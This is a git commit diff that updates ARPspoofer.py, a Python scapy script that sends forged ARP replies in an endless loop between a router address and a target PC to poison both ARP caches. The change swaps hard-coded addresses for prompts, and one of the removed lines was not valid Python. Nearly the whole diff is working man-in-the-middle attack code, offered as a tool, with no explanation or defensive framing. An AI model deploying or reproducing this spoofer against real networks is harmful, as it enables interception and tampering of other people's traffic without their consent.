2cf57cb8c3b6ab35216ae1a0295f8ad8744dee89
mscates <32601042+Friendofmario@users.noreply.github.com>
2020-06-09 11:59:35 -0700

    Update ARPspoofer.py

--- src/ARPspoofer.py
+++ src/ARPspoofer.py
@@ -9,15 +9,15 @@ print(os.sys.path)
 import socket
 from scapy.all import *
 
-routerip = socket.gethostbyname(socket.gethostname())
-macip = 192.168.1.8
+routerip = input("Enter the public IP: ")
+pcip = input("Enter the private IP: ")
 
 def get_target_mac(ip):
     arp_request = scapy.all.ARP(pdst=ip)
 #    arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
     finalpacket = broadcast/arp_request
-    answer = scapy.all.srp(finalpacket, timeout=2, verbose=False)[0]
+    answer = scapy.all.srp(finalpacket, timeout=3, verbose=False)[0]
     print len(answer)
     if len(answer) == 0:
         return
@@ -27,18 +27,23 @@ def get_target_mac(ip):
 def spoof_arp(target_ip,spoofed_ip):
     mac = get_target_mac(target_ip)
     #print mac
-    packet = scapy.all.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
+    packet = scapy.all.ARP(op=2,hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
     scapy.all.send(packet, verbose=False)
-
+    verbose = False
+    if verbose:
+        self_mac = ARP().hwsrc
+        #print "format(target_ip, host_ip, self_mac)" + format(target_ip, spoofed_ip, self_mac)
+               
 def main():
     iter = 0
     try:
         while True:
-            spoof_arp(routerip,macip)
-            spoof_arp(macip,routerip)
+            spoof_arp(routerip,pcip)
+            spoof_arp(pcip,routerip)
             iter = iter + 1;
             print iter
     except KeyboardInterrupt:
+        print "Detected interrupt"
         exit(0)
 
 main()
